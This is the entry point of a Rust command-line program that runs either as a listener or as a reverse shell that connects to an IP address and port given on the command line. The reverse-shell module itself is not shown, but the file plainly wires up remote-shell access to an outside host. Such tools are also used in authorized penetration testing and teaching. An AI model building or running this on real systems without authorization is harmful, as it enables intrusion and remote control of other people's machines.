use clap::Parser;
use cli::Args;

mod cli;
mod errors;
mod listener;
mod reverse_shell;

/// Entry point of the program
/// Async main function that returns a Result<(), anyhow::Error>
#[tokio::main]
async fn main() -> anyhow::Result<()> {
    // CLI arguments parsing and checking
    let args = Args::parse();
    let ip: &str = args.address.as_str();
    let port: u16 = args.port;

    if ip.is_empty() {
        return Err(errors::CLIError::EmptyArgument {
            arg: String::from("address, -a"),
        }
        .into());
    } else if args.listen && ip != "127.0.0.1" {
        return Err(errors::CLIError::IncompatibleArgs.into());
    }

    // Selection block to run the program as a listener or as a reverse shell
    if args.listen {
        match listener::listen(ip, port).await {
            Ok(_) => Ok(()),
            Err(e) => {
                eprintln!("Error: {}", e);
                Err(e)
            }
        }
    } else {
        match reverse_shell::run(ip, port).await {
            Ok(_) => Ok(()),
            Err(e) => {
                eprintln!("Error: {}", e);
                Err(e)
            }
        }
    }
}
